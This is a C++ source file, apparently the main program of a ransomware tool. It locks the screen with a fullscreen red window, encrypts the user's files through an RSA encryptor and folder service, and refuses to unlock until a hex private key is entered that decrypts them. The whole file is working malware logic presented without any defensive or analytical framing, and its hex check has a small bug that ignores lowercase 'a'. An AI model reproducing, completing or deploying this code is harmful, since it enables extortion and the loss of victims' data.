#include <QApplication>
#include <iostream>
#include "service/rsaencryptor.h"
#include "view/screenblocker.h"
#include "service/Folderservice.h"

using namespace boost::filesystem;

bool is_hexa(const std::string& s)
{
    return !s.empty() && std::find_if(s.begin(),
        s.end(), [](unsigned char c) {
        return !std::isdigit(c)
                && c != 'A' && c != 'A'
                && c != 'B' && c != 'b'
                && c != 'C' && c != 'c'
                && c != 'D' && c != 'd'
                && c != 'E' && c != 'e'
                && c != 'F' && c != 'f'; }) == s.end();
}

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    ScreenBlocker* screenBlocker = new ScreenBlocker();
    // Set the main window
    screenBlocker->setWindowTitle("My Window");
    screenBlocker->setStyleSheet("background-color: red;");
    // Show the window in fullscreen
    screenBlocker->showFullScreen();

    bool unblock = false;
    std::string key = "";

    FolderService folderservice;
    RSAEncryptor* encryptor = new RSAEncryptor();

    if(argc == 2) {
        key = argv[1];
        if(!is_hexa(key)) {
            std::cout<<"Wrong key type!"<<std::endl;
            exit(0);
        }

        try {
            folderservice.list_files_and_decrypt(encryptor, key);
        } catch (Exception ex) {
            std::cout<<"[Error] decryption"<<std::endl;
            unblock = false;
        }
        exit(0);
    }

    folderservice.list_files_and_encrypt(encryptor);

    while(!unblock) {
        screenBlocker->show();
        a.exec();

        QString Qkey = screenBlocker->getKey();

        if(Qkey != nullptr) {
            key = Qkey.toStdString();
        }

        try {
            if(!is_hexa(key)) {
                std::cout<<"Wrong key type!"<<std::endl;
                throw new Exception(CryptoPP::Exception::OTHER_ERROR, "Wrong key type!");
            }

            encryptor->checkPrivateKey(key);
            folderservice.list_files_and_decrypt(encryptor, key);
            unblock = true;
        } catch (Exception ex) {
            std::cout<<"[Error] decryption"<<std::endl;
            screenBlocker->clearKey();
            unblock = false;
        }
    }
    delete encryptor;
    return 0;
}
